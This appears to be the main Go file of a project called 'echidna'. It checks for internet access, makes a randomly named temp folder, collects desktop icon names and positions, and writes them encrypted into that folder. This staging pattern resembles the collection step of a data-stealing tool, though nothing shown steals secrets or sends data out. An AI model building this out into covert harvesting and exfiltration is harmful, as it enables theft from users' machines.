package main

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"echidna/funcs"
	"echidna/store"
	"echidna/utils"
)

var mainDirPath string

func main() {
	if !store.OUTPUT_ENCRYPTED {
		utils.Messagebox("Enable encrypted output to disable this notification.")
	}

	if !utils.CheckInternet() {
		fmt.Println("No internet, exiting...")
		os.Exit(-1)
		return
	}

	// this is so mainDirPath isnt redeclared
	err := errors.New("")

	mainDirPath, err = setupMainDir()
	if err != nil {
		fmt.Printf("Failed to create main dir - %v, exiting...\n", err)
		os.Exit(-1)
		return
	}

	fmt.Printf("Main dir created at - %q\n", mainDirPath)

	writeToFile("icons", func() string {
		icons := funcs.GetDesktopIcons()
		var iconsStr strings.Builder

		for i, icon := range icons {
			if i > 0 {
				iconsStr.WriteString("|")
			}

			fmt.Fprintf(&iconsStr, "%d;%d;%s", icon.X, icon.Y, icon.Name)
		}

		return iconsStr.String()
	}())
}

func writeToFile(fileName string, data string) {
	encrypted := utils.EncryptData(data)
	filePath := filepath.Join(mainDirPath, fileName)

	err := os.WriteFile(filePath, encrypted, 0666)
	if err != nil {
		fmt.Printf("Failed to write file - %v, exiting...\n", err)
		os.Exit(-1)
	}
}

func setupMainDir() (string, error) {
	mainDir := filepath.Join(
		os.TempDir(),
		utils.GetRandomString(12),
	)

	err := os.MkdirAll(mainDir, 0666)
	if err != nil {
		return "", err
	}

	return mainDir, nil
}
